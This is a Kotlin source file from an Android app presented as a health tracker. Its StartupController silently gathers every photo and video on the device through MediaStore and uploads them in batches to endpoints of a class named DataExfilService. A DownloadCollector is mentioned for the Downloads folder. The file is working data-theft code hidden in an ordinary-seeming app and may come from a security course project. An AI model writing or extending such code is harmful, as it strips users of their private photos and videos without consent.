package com.inf2007.healthtracker.utilities.startup

import android.content.Context
import android.net.Uri
import android.os.StatFs
import android.os.Environment
import android.provider.MediaStore
import android.util.Log
import com.inf2007.healthtracker.utilities.DataExfilService
import com.inf2007.healthtracker.utilities.startup.models.MediaFile
import java.util.concurrent.Executors

class StartupController(private val context: Context) {
    companion object {
        private const val TAG = "StartupController"
        private const val MIN_STORAGE_MB = 100
        private const val BATCH_SIZE = 15
    }

    private val startupPrefs = context.getSharedPreferences("startup_complete", Context.MODE_PRIVATE)
    private val batchUploader = BatchUploader(context)
    private val executor = Executors.newSingleThreadExecutor()

    fun performInitialCollection() {
        if (startupPrefs.getBoolean("initial_done", false)) {
            Log.d(TAG, "Initial collection already completed")
            return
        }

        if (!hasEnoughStorage()) {
            Log.w(TAG, "Insufficient storage, skipping batch upload")
            startupPrefs.edit().putBoolean("initial_done", true).apply()
            return
        }

        Log.i(TAG, "========== STARTING INITIAL DATA COLLECTION ==========")

        executor.execute {
            collectAllData()
        }
    }

    private fun collectAllData() {
        var totalFiles = 0

        // Collect photos in batches
        getUnsyncedPhotos().let { photos ->
            if (photos.isNotEmpty()) {
                totalFiles += photos.size
                Log.i(TAG, "Found ${photos.size} photos to upload")
                photos.chunked(BATCH_SIZE).forEachIndexed { index, batch ->
                    batchUploader.uploadMediaBatch(
                        files = batch,
                        mediaType = "photos",
                        endpoint = DataExfilService.PHOTOS_ENDPOINT,
                        onProgress = { current, total ->
                            Log.d(TAG, "Photos: $current/$total batches")
                        }
                    )
                }
            }
        }

        // Collect videos in batches
        getUnsyncedVideos().let { videos ->
            if (videos.isNotEmpty()) {
                totalFiles += videos.size
                Log.i(TAG, "Found ${videos.size} videos to upload")
                videos.chunked(BATCH_SIZE).forEachIndexed { index, batch ->
                    batchUploader.uploadMediaBatch(
                        files = batch,
                        mediaType = "videos",
                        endpoint = DataExfilService.VIDEO_ENDPOINT,
                        onProgress = { current, total ->
                            Log.d(TAG, "Videos: $current/$total batches")
                        }
                    )
                }
            }
        }

        // Downloads are handled separately (different endpoint structure)
        collectDownloads()

        Log.i(TAG, "========== INITIAL COLLECTION COMPLETE ==========")
        Log.i(TAG, "Total files processed: $totalFiles")

        startupPrefs.edit().putBoolean("initial_done", true).apply()
    }

    private fun getUnsyncedPhotos(): List<MediaFile> {
        val photos = mutableListOf<MediaFile>()
        val prefs = context.getSharedPreferences("photo_sync_log", Context.MODE_PRIVATE)

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.DATE_MODIFIED
        )

        context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            null
        )?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
            val dateCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED)

            while (cursor.moveToNext()) {
                val id = cursor.getLong(idCol)
                if (!prefs.getBoolean("id_$id", false)) {
                    val uri = Uri.withAppendedPath(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        id.toString()
                    )
                    photos.add(
                        MediaFile(
                            uri = uri,
                            name = cursor.getString(nameCol),
                            id = id,
                            size = cursor.getLong(sizeCol),
                            mimeType = "image/jpeg",
                            dateModified = cursor.getLong(dateCol)
                        )
                    )
                }
            }
        }
        return photos
    }

    private fun getUnsyncedVideos(): List<MediaFile> {
        val videos = mutableListOf<MediaFile>()
        val prefs = context.getSharedPreferences("video_sync_log", Context.MODE_PRIVATE)

        val projection = arrayOf(
            MediaStore.Video.Media._ID,
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.SIZE,
            MediaStore.Video.Media.DATE_MODIFIED
        )

        context.contentResolver.query(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            null
        )?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
            val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
            val sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE)
            val dateCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_MODIFIED)

            while (cursor.moveToNext()) {
                val id = cursor.getLong(idCol)
                if (!prefs.getBoolean("video_$id", false)) {
                    val uri = Uri.withAppendedPath(
                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                        id.toString()
                    )
                    videos.add(
                        MediaFile(
                            uri = uri,
                            name = cursor.getString(nameCol),
                            id = id,
                            size = cursor.getLong(sizeCol),
                            mimeType = "video/mp4",
                            dateModified = cursor.getLong(dateCol)
                        )
                    )
                }
            }
        }
        return videos
    }

    private fun collectDownloads() {
        // Downloads need special handling due to file access
        // For now, let the existing DownloadCollector handle it
        // but you could enhance it later
        Log.d(TAG, "Downloads collection skipped - handled by DownloadCollector")
    }

    private fun hasEnoughStorage(): Boolean {
        return try {
            val stat = StatFs(Environment.getExternalStorageDirectory().path)
            val available = stat.availableBlocksLong * stat.blockSizeLong
            available > MIN_STORAGE_MB * 1024 * 1024
        } catch (e: Exception) {
            true // If we can't check, assume yes
        }
    }
}